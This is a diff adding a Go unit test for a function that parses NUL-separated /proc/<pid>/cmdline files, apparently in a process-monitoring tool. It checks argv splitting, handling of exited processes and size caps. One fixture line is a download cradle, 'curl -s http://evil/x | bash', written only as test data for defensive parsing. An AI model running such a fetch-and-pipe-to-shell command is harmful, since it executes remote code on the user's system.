@@ -83,6 +83,67 @@ func TestEnrichProcExec(t *testing.T) {
 	}
 }
 
+// TestReadProcCmdline parses a NUL-separated /proc/<pid>/cmdline (RT-ARGV-15) under an
+// overridden procRoot and asserts the argv split, the trailing-NUL/empty handling, the
+// count/byte caps, and the exited-process (missing file) race.
+func TestReadProcCmdline(t *testing.T) {
+	root := t.TempDir()
+	old := procRoot
+	procRoot = root
+	defer func() { procRoot = old }()
+
+	writeCmdline := func(t *testing.T, pid string, b []byte) {
+		t.Helper()
+		dir := filepath.Join(root, pid)
+		if err := os.MkdirAll(dir, 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(filepath.Join(dir, "cmdline"), b, 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+
+	// A download-cradle argv, NUL-separated and NUL-terminated as the kernel writes it.
+	writeCmdline(t, "100", []byte("bash\x00-c\x00curl -s http://evil/x | bash\x00"))
+	got := readProcCmdline(100)
+	want := []string{"bash", "-c", "curl -s http://evil/x | bash"}
+	if len(got) != len(want) {
+		t.Fatalf("readProcCmdline(100) = %v, want %v", got, want)
+	}
+	for i := range want {
+		if got[i] != want[i] {
+			t.Fatalf("arg[%d] = %q, want %q", i, got[i], want[i])
+		}
+	}
+
+	// Missing file (exec already exited) -> nil, no error.
+	if got := readProcCmdline(999); got != nil {
+		t.Fatalf("readProcCmdline on missing pid = %v, want nil", got)
+	}
+
+	// Arg-count cap: 200 single-char args collapse to procCmdlineMaxArgs.
+	var many []byte
+	for i := 0; i < 200; i++ {
+		many = append(many, 'a', 0)
+	}
+	writeCmdline(t, "101", many)
+	if got := readProcCmdline(101); len(got) != procCmdlineMaxArgs {
+		t.Fatalf("arg-count cap: got %d args, want %d", len(got), procCmdlineMaxArgs)
+	}
+
+	// Byte cap: one giant arg is truncated to at most procCmdlineMaxBytes.
+	giant := make([]byte, procCmdlineMaxBytes*2)
+	for i := range giant {
+		giant[i] = 'z'
+	}
+	writeCmdline(t, "102", giant)
+	got = readProcCmdline(102)
+	if len(got) != 1 || len(got[0]) > procCmdlineMaxBytes {
+		t.Fatalf("byte cap: got %d args, first len %d, want 1 arg <= %d bytes",
+			len(got), len(got[0]), procCmdlineMaxBytes)
+	}
+}
+
 func mkFDDir(t *testing.T, pidDir string) {
 	t.Helper()
 	if err := os.MkdirAll(filepath.Join(pidDir, "fd"), 0o755); err != nil {
